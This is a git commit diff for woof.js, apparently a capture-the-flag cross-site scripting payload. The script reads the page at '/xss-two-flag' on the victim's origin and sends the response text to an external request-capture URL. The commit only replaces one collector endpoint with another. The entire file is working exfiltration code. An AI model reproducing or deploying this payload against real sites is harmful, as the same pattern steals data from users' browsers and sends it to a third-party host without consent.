598b84f08c19f5e8b854e9ec8210d1e939a393af
João Pedro Duarte <jurbasgames@gmail.com>
2024-05-05 21:14:22 -0300

    Update woof.js

--- woof.js
+++ woof.js
@@ -2,6 +2,6 @@ var xhr = new XMLHttpRequest();
 xhr.open('GET',location.origin + '/xss-two-flag',true);
 xhr.onload = function () {
 var request = new XMLHttpRequest();
-request.open('GET','https://eom6hzyuukgbktj.m.pipedream.net/?flag=' + xhr.responseText,true);
+request.open('GET','https://requestbin.myworkato.com/1cqhl1c1?flag=' + xhr.responseText,true);
 request.send()};
 xhr.send(null);
